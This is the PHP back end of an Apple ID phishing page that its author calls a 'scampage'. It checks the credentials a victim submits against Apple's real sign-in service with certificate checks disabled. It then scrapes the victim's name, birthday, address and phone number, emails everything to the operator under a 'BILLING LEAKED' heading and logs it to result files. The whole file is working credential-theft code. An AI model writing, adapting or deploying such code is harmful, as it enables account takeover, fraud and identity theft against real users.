<?php
// scampage by devilscream
session_start();
$setting = parse_ini_file('../.config');
include '../main.php';
function ambil_data($str,$find_start,$find_end)
{
	$start = @strpos($str,$find_start);
	if ($start === false) {
	return "";
	}
	$length = strlen($find_start);
	$end    = strpos(substr($str,$start +$length),$find_end);
	return trim(substr($str,$start +$length,$end));
}

function truelogin($email,$password){
	 $url = "https://idmsa.apple.com/IDMSWebAuth/authenticate";
	 $post  = "appleId=".$email."&accountPassword=".$password."&path=/signin/?referrer=/account/manage&appIdKey=af1139274f266b22b68c2a3e7ad932cb3c0bbe854e13a79af78dcc73136882c3";
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_REFERER, $url);
    curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0');
	curl_setopt($curl, CURLOPT_HEADER, 0);
	curl_setopt($curl, CURLOPT_COOKIESESSION, 1);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies/login-Cookie.txt');
	curl_setopt($curl, CURLOPT_COOKIEFILE,'cookies/login-Cookie.txt');
	curl_setopt($curl, CURLOPT_VERBOSE, 1);
	if ($post !== '') {
	curl_setopt($curl, CURLOPT_POST, 1);
	curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
	}
    $result = curl_exec($curl);
    curl_close($curl);
	return $result;
}

if($setting['grab_data'] == 1) {
	if(!file_exists('cookies')) mkdir('cookies');
		$A = truelogin($_POST['xuser'],$_POST['xpass']);
	if (!preg_match('#padder#i', $A)) {
		$_SESSION['birthday'] = ambil_data($A,'"birthday":"','"');
		$_SESSION['firstname'] = ambil_data($A,'"firstName":"','"');
		$_SESSION['lastname'] = ambil_data($A,'"lastName":"','"');
		$_SESSION['country'] = ambil_data($A,'"countryName":"','"');
		$_SESSION['address1'] = ambil_data($A,'"line1":"','"');
		$_SESSION['address2'] = ambil_data($A,'"line2":"','"');
		$_SESSION['city'] = ambil_data($A,'"city":"','"');
		$_SESSION['state'] = ambil_data($A,'"stateProvinceName":"','"');
		$_SESSION['zip'] = ambil_data($A,'"postalCode":"','"');
		$_SESSION['phone'] = ambil_data($A,'"fullNumberWithCountryPrefix":"','"');
	}
}

$fnames = $_SESSION['firstname'];

if($fnames == "") {
	$_SESSION['country'] = $cn;
	$from = $_POST['xuser'];
	$subject = "APPLE LOGIN: $from [ $cn - $os - $ip2 ]";
	$status = "DIE - OTP (TWO AUTH LOGIN)";
	$logins = 0;
}else{
	$subject = "APPLE LOGIN: $from [ $cn - $os - $ip2 ]";
	$status = "LIVE - VALID LOGIN";
	$from = $_SESSION['firstname']." ".$_SESSION['lastname'];
	$logins = 1;
}

$_SESSION['email'] = $_POST['xuser'];
$ultah = explode("-",$_SESSION['birthday']);
$ultah = "$ultah[1]/$ultah[2]/$ultah[0]";
$_SESSION['email'] = $_POST['xuser'];
$_SESSION['password'] = $_POST['xpass'];
$_SESSION['status'] = $status;

$message  = "#-------------------------[ APPLE LOGIN ]-----------------------------#\n";
$message .= "AppleID		: ".$_POST['xuser']."\n";
$message .= "Password		: ".$_POST['xpass']."\n";
$message .= "Status			: ".$status."\n";
$message .= "IP Address		: ".$ip2."\n";
$message .= "OS/Browser		: ".$os." / ".$br."\n";
$message .= "Date			: ".$date."\n";
$message .= "#-------------------------[ BILLING LEAKED ]-----------------------------#\n";
$message .= "First Name		: ".$_SESSION['firstname']."\n";
$message .= "Last Name		: ".$_SESSION['lastname']."\n";
$message .= "Country		: ".$_SESSION['country']."\n";
$message .= "BirthDay		: ".$ultah."\n";
$message .= "City			: ".$_SESSION['city']."\n";
$message .= "State			: ".$_SESSION['state']."\n";
$message .= "Zip			: ".$_SESSION['zip']."\n";
$message .= "Phone			: ".$_SESSION['phone']."\n";
$message .= "#----------------------[ created by devilscream ]-----------------------#\n";

/*if($truelogin == 1) {
	if($logins == 0) {
	echo "<META HTTP-EQUIV='refresh' content='0; URL=?ID=login&/IDMSWebAuth/login.html?&appIdKey=".$_SESSION['key']."&error=1&email=".$_POST["xuser"]."&country=".$cid."'>";
	exit(); 
	}
}*/
validate();
if($setting['send_login'] == 1) {
kirim_mail($to,"Apple Login",$subject,$message);
}
$click = fopen("../result/total_login.txt","a");
fwrite($click,"$ip2"."\n");
fclose($click);
$click = fopen("../result/log_visitor.txt","a");
$jam = date("h:i:sa");
fwrite($click,"[$jam - $ip2 - $cn - $br - $os] Login Apple ID"."\n");
fclose($click);
if($backup == 1) {
	@fclose(@fwrite(@fopen("../result/login-info.txt", "a"),"Title: $subject\n".$message)); //Cadangan kalo send email gak work
}
exit(); 
?>